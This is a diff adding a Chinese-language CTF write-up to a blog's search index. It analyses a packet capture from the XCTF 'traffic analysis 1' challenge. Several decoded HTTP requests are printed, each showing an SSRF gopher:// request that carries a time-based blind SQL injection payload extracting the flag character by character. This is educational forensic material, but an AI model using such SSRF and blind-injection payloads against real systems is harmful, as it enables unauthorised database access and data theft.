@@ -234,4 +234,56 @@
         <tag>网络安全</tag>
       </tags>
   </entry>
+  <entry>
+    <title>流量分析1</title>
+    <url>/2025/11/18/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%901/</url>
+    <content><![CDATA[<h2 id="流量分析1"><a href="#流量分析1" class="headerlink" title="流量分析1"></a>流量分析1</h2><p><a href="https://adworld.xctf.org.cn/challenges/list">攻防世界 流量分析1</a></p>
+<span id="more"></span>
+
+<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul>
+<li><a href="#jump1">题目</a></li>
+<li><a href="#jump2">预计时间</a></li>
+<li><a href="#jump3">题目分析及截图</a></li>
+</ul>
+<hr>
+<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a><a id=" jump1">题目</a></h4><img src="/2025/11/18/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%901/1.png" class="" title="This is an image">
+
+<h4 id="预计时间"><a href="#预计时间" class="headerlink" title="预计时间"></a><a id="jump2">预计时间</a></h4><p>1h</p>
+<h4 id="题目分析及截图"><a href="#题目分析及截图" class="headerlink" title="题目分析及截图"></a><a id="jump3">题目分析及截图</a></h4><p>流量分析题我们先把http包筛选出来，<strong>为什么筛选http包？</strong></p>
+<p>简单来说，看HTTP包时为了<strong>直接理解”用户在做什么”和应用在做什么</strong>，可以直接理解应用层意图</p>
+<p>我们筛选出来http包之后，随机选择一个http包，右键追踪流，然后发现我们的请求有url编码</p>
+<img src="/2025/11/18/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%901/2.png" class="" title="This is an image">
+
+<p>我们解码（解一次码之后还有url编码，那我们就再解一次），得到</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php?url=gopher://127.0.0.1:80/_POST</span> /admin.php <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="string">Host:</span> localhost:80</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>80</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">id</span>=<span class="number">1</span>) and if((ascii(substr((select flag from flag),<span class="number">14</span>,<span class="number">1</span>))=&#x27;<span class="number">125</span>&#x27;),sleep(<span class="number">3</span>),<span class="number">0</span>) --  HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Host</span>: <span class="number">39.105.136.196:30025</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">User</span>-Agent: python-requests/<span class="number">2</span>.<span class="number">24</span>.<span class="number">0</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Accept</span>-Encoding: gzip, deflate</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Accept</span>: */*</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Connection</span>: keep-alive</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>关键句是<code>if((ascii(substr((select flag from flag),14,1))=&#39;125&#39;),sleep(3),0)</code></p>
+<blockquote>
+<p>查看flag表中flag值的第n个字符，如果这个字符是x (ASCII码为**)，那么就让数据库睡眠3秒钟；否则，就什么都不做（返回0）</p>
+</blockquote>
+<p>就是检验是否是flag里对应的字符，并且如果是flag里面的字符的话，睡眠3秒</p>
+<p>那我们可以直接去搜索睡眠时间&gt;&#x3D;3秒的http包</p>
+<img src="/2025/11/18/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%901/3.png" class="" title="This is an image">
+
+<p>我们从时间最长的包开始查看追踪流</p>
+<img src="/2025/11/18/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%901/4.png" class="" title="This is an image">
+
+<p>我们url解码再解码,得到</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php?url=gopher://127.0.0.1:80/_POST</span> /admin.php <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="string">Host:</span> localhost:80</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>80</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">id</span>=<span class="number">1</span>) and if((ascii(substr((select flag from flag),<span class="number">14</span>,<span class="number">1</span>))=&#x27;<span class="number">125</span>&#x27;),sleep(<span class="number">3</span>),<span class="number">0</span>) --  HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Host</span>: <span class="number">39.105.136.196:30025</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">User</span>-Agent: python-requests/<span class="number">2</span>.<span class="number">24</span>.<span class="number">0</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Accept</span>-Encoding: gzip, deflate</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Accept</span>: */*</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Connection</span>: keep-alive</span></span><br></pre></td></tr></table></figure>
+
+<p><code>&#125;</code>对应的ascll码为<code>125</code>，可能是flag的最后一位</p>
+<p>我们看一看时间最短的那个包</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php?url=gopher://127.0.0.1:80/_POST</span> /admin.php <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="string">Host:</span> localhost:80</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>79</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">id</span>=<span class="number">1</span>) and if((ascii(substr((select flag from flag),<span class="number">1</span>,<span class="number">1</span>))=&#x27;<span class="number">102</span>&#x27;),sleep(<span class="number">3</span>),<span class="number">0</span>) --  HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Host</span>: <span class="number">39.105.136.196:30025</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">User</span>-Agent: python-requests/<span class="number">2</span>.<span class="number">24</span>.<span class="number">0</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Accept</span>-Encoding: gzip, deflate</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Accept</span>: */*</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Connection</span>: keep-alive</span></span><br></pre></td></tr></table></figure>
+
+<p><code>f</code>对应的ascll码<code>102</code></p>
+<p>基本可以确定这个就是flag了</p>
+<p>我们一个一个包看，最后就可以得到Flag,你也可以使用exp求解flag但是我实力不足，等我会了我会更新的</p>
+]]></content>
+      <tags>
+        <tag>MISC</tag>
+        <tag>流量分析</tag>
+      </tags>
+  </entry>
 </search>
